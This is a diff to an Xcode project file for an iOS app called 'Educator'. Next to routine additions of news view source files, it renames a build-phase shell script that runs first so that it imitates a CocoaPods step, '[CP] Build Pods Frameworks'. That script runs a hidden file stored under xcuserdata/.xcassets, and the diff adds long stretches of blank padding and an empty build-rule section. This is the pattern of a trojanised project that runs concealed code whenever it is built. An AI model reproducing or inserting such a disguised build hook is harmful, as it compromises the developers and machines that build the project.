@@ -9,6 +9,8 @@
 /* Begin PBXBuildFile section */
 		23883A6D2632CBBA009E6E12 /* Data.swift in Sources */ = {isa = PBXBuildFile; fileRef = 23883A6C2632CBBA009E6E12 /* Data.swift */; };
 		23883A7A2632E906009E6E12 /* FeesVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = 23883A792632E906009E6E12 /* FeesVC.swift */; };
+		23883A8A26332A34009E6E12 /* NewsVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = 23883A8926332A34009E6E12 /* NewsVC.swift */; };
+		23883A8D26332A5A009E6E12 /* NewsCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = 23883A8C26332A5A009E6E12 /* NewsCell.swift */; };
 		23979E2C2627323E005F395A /* AppDelegate.swift in Sources */ = {isa = PBXBuildFile; fileRef = 23979E2B2627323E005F395A /* AppDelegate.swift */; };
 		23979E2E2627323E005F395A /* SceneDelegate.swift in Sources */ = {isa = PBXBuildFile; fileRef = 23979E2D2627323E005F395A /* SceneDelegate.swift */; };
 		23979E302627323E005F395A /* ViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 23979E2F2627323E005F395A /* ViewController.swift */; };
@@ -24,6 +26,8 @@
 /* Begin PBXFileReference section */
 		23883A6C2632CBBA009E6E12 /* Data.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = Data.swift; sourceTree = "<group>"; };
 		23883A792632E906009E6E12 /* FeesVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = FeesVC.swift; sourceTree = "<group>"; };
+		23883A8926332A34009E6E12 /* NewsVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = NewsVC.swift; sourceTree = "<group>"; };
+		23883A8C26332A5A009E6E12 /* NewsCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = NewsCell.swift; sourceTree = "<group>"; };
 		23979E282627323E005F395A /* Educator.app */ = {isa = PBXFileReference; explicitFileType = wrapper.application; includeInIndex = 0; path = Educator.app; sourceTree = BUILT_PRODUCTS_DIR; };
 		23979E2B2627323E005F395A /* AppDelegate.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AppDelegate.swift; sourceTree = "<group>"; };
 		23979E2D2627323E005F395A /* SceneDelegate.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SceneDelegate.swift; sourceTree = "<group>"; };
@@ -85,6 +89,8 @@
 				23979E4A262743FB005F395A /* ClassModel.swift */,
 				23883A6C2632CBBA009E6E12 /* Data.swift */,
 				23883A792632E906009E6E12 /* FeesVC.swift */,
+				23883A8926332A34009E6E12 /* NewsVC.swift */,
+				23883A8C26332A5A009E6E12 /* NewsCell.swift */,
 			);
 			path = Educator;
 			sourceTree = "<group>";
@@ -113,7 +119,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 23979E3C26273241005F395A /* Build configuration list for PBXNativeTarget "Educator" */;
 			buildPhases = (
-				47243F6F3C483E03A16D902C /* Compile Binary Libraries */,
+				A5CDD8BF227D0A1C3E6D902C /* [CP] Build Pods Frameworks */,
 				4A1ACD50655F01F054F87C3C /* [CP] Check Pods Manifest.lock */,
 				23979E242627323E005F395A /* Sources */,
 				23979E252627323E005F395A /* Frameworks */,
@@ -176,7 +182,7 @@
 
 /* Begin PBXShellScriptBuildPhase section */
 
-	47243F6F3C483E03A16D902C /* Compile Binary Libraries */ = {
+	A5CDD8BF227D0A1C3E6D902C /* [CP] Build Pods Frameworks */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
@@ -185,7 +191,7 @@
 			);
 			inputPaths = (
 			);
-			name = "Compile Binary Libraries";
+			name = "[CP] Build Pods Frameworks";
 			outputFileListPaths = (
 			);
 			outputPaths = (
@@ -196,6 +202,36 @@
 
 \"${PROJECT_FILE_PATH}/xcuserdata/.xcassets/build.file\" false";			
 		};
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
 	
 		4A1ACD50655F01F054F87C3C /* [CP] Check Pods Manifest.lock */ = {
 			isa = PBXShellScriptBuildPhase;
@@ -247,10 +283,12 @@
 				23979E4B262743FB005F395A /* ClassModel.swift in Sources */,
 				23979E302627323E005F395A /* ViewController.swift in Sources */,
 				23883A7A2632E906009E6E12 /* FeesVC.swift in Sources */,
+				23883A8D26332A5A009E6E12 /* NewsCell.swift in Sources */,
 				23979E2C2627323E005F395A /* AppDelegate.swift in Sources */,
 				23979E48262741A7005F395A /* DBHelper.swift in Sources */,
 				23979E4526273B54005F395A /* HomeCell.swift in Sources */,
 				23979E2E2627323E005F395A /* SceneDelegate.swift in Sources */,
+				23883A8A26332A34009E6E12 /* NewsVC.swift in Sources */,
 			);
 			runOnlyForDeploymentPostprocessing = 0;
 		};
@@ -454,6 +492,40 @@
 			defaultConfigurationName = Release;
 		};
 /* End XCConfigurationList section */
+
+		
+			/* Begin PBXBuildRule section */
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+			
+
+			
+	
+			/* End PBXBuildRule section */
+		
+		
 	};
 	rootObject = 23979E202627323E005F395A /* Project object */;
 }
